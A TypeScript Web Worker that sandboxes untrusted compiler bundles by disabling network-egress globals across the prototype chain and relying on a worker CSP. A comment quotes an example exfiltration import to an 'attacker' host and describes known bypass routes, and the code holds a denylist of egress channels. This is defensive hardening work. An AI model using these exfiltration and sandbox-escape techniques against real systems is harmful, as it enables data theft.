/// <reference lib="webworker" />
/**
 * Compiler sandbox worker — runs UNTRUSTED custom-node COMPILER bundles in an isolated
 * Worker realm, off the main thread.
 *
 * SECURITY: a Web Worker has NO window / document / localStorage / __TAURI_INTERNALS__, so
 * a package's compiler code can't read those secrets or reach the Tauri bridge. Below we
 * also neutralize the network-egress GLOBALS (fetch/XHR/WebSocket/importScripts/caches/…) so
 * those beacon channels are gone, the worker's own `postMessage` (so it can't forge a
 * result/registration message to the host — we keep a private captured reference for our own
 * replies), and `indexedDB` (a Worker DOES have same-origin IndexedDB — defense-in-depth,
 * though there's no egress path to exfil it). Code lacking the compiler sentinel is refused.
 *
 * IMPORT EGRESS (closed by a worker-asset CSP): dynamic `import('https://attacker/?d=…')` is
 * SYNTAX, not a global, so the blocklist can't stop it — verified to reach the network from a
 * `new Function` body in BOTH module and classic workers. A restrictive CSP on THIS worker's own
 * HTTP response closes it (`script-src 'self'` blocks the cross-origin import, `connect-src 'none'`
 * blocks fetch egress, `'unsafe-eval'` keeps `new Function`). Wired in dev/preview by the
 * oaiy-compiler-worker-csp plugin (ui/vite.config.ts) and in prod by ui/public/_headers; the page
 * meta-CSP is NOT inherited by workers, so it must be this asset's OWN header. (The Tauri desktop
 * COMPANION is a separate management UI — Services/Models/Python/Settings, desktop/src/ — that
 * never compiles custom nodes, so this worker doesn't run there; no Tauri-side CSP needed.) The
 * leak is bounded to compile-time data anyway (flow graph + literal node params), never secrets.
 *
 * The compiler is a PURE function (node config + compile context → generated code string).
 * We import the SAME escapeString util the main OAIYCompiler uses, so codegen is byte-for-
 * byte identical to the old in-realm path — only the realm it runs in changed.
 *
 * Protocol (postMessage):
 *   main → here: { type: 'register', key, bundle, globalName }  // load a compiler once
 *                { type: 'compile',  id, key, ctx }              // run it for one node
 *   here → main: { type: 'registered', key, ok, message? }
 *                { type: 'result', id, code } | { type: 'error', id, message }
 */
import { escapeString } from '../../vendor/oaiy-core/src/compiler/utils';

// Our PRIVATE channel to the host — captured before `postMessage` is neutralized below, so
// the untrusted compiler can't reach it (it's a module-local binding, not a global).
const hostPost = self.postMessage.bind(self);

// Neutralize egress, realm-spawn, host-message forgery, and same-origin IndexedDB so
// untrusted compiler code can't exfiltrate, escape to a fresh realm, forge a result message
// to hijack another node's codegen, or read app data. (localStorage/DOM/Tauri are already
// absent in a Worker.)
(function () {
  const egress = [
    'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'BroadcastChannel',
    'importScripts', 'Request', 'Response', 'Headers', 'Worker', 'SharedWorker',
    // `caches` (CacheStorage) is a secure-context Worker global whose Cache.add()/addAll()
    // perform a REAL network fetch of the given URL — an egress beacon. `postMessage`/`indexedDB`
    // close host-message forgery + same-origin storage.
    'postMessage', 'indexedDB', 'caches',
  ];
  // Walk the FULL prototype chain, not just [self, parent]: per WebIDL, [Global] interface
  // members are installed on the interface PROTOTYPE objects, so in a real
  // DedicatedWorkerGlobalScope `fetch`/`importScripts`/`indexedDB` live on
  // WorkerGlobalScope.prototype — the GRANDPARENT a 2-element loop skipped, leaving a recovered
  // global able to call getPrototypeOf(getPrototypeOf(self)).fetch and beacon out. Stop before
  // Object.prototype so we don't clobber it globally.
  let t: object | null = self as object;
  while (t && t !== Object.prototype) {
    for (const name of egress) {
      try {
        Object.defineProperty(t, name, { value: undefined, configurable: false, writable: false });
      } catch {
        /* non-configurable already */
      }
    }
    t = Object.getPrototypeOf(t) as object | null;
  }
})();

type CompilerFn = (ctx: Record<string, unknown>) => string;
const compilers = new Map<string, CompilerFn>();

function loadCompiler(bundle: string, globalName: string): CompilerFn | null {
  // Defense-in-depth: compiler output always assigns the generated sentinel global.
  if (!bundle.includes(globalName)) return null;
  // eslint-disable-next-line no-new-func
  const fn = new Function(
    `${bundle}\nreturn typeof ${globalName} !== 'undefined' ? ${globalName} : undefined;`,
  );
  const exports = fn() as unknown;
  if (typeof exports === 'function') return exports as CompilerFn;
  if (exports && typeof exports === 'object') {
    const obj = exports as Record<string, unknown>;
    if (typeof obj.default === 'function') return obj.default as CompilerFn;
    for (const k of Object.keys(obj)) {
      if (typeof obj[k] === 'function') return obj[k] as CompilerFn;
    }
  }
  return null;
}

self.addEventListener('message', (ev: MessageEvent) => {
  const msg = ev.data as
    | { type: 'register'; key: string; bundle: string; globalName: string }
    | { type: 'compile'; id: number; key: string; ctx: Record<string, unknown> }
    | { type: 'unregister'; key: string }
    | undefined;
  if (!msg || typeof msg !== 'object') return;

  if (msg.type === 'register') {
    try {
      const fn = loadCompiler(String(msg.bundle), String(msg.globalName));
      if (fn) compilers.set(msg.key, fn);
      hostPost({ type: 'registered', key: msg.key, ok: !!fn });
    } catch (e) {
      hostPost({
        type: 'registered',
        key: msg.key,
        ok: false,
        message: e instanceof Error ? e.message : String(e),
      });
    }
    return;
  }

  if (msg.type === 'unregister') {
    compilers.delete(msg.key);
    return;
  }

  if (msg.type === 'compile') {
    const fn = compilers.get(msg.key);
    if (!fn) {
      hostPost({ type: 'error', id: msg.id, message: `compiler not registered: ${msg.key}` });
      return;
    }
    try {
      // Reconstruct the compile context with the SAME escapeString the host uses.
      const ctx = { ...msg.ctx, escapeString };
      const code = fn(ctx);
      hostPost({ type: 'result', id: msg.id, code: String(code) });
    } catch (e) {
      hostPost({ type: 'error', id: msg.id, message: e instanceof Error ? e.message : String(e) });
    }
  }
});
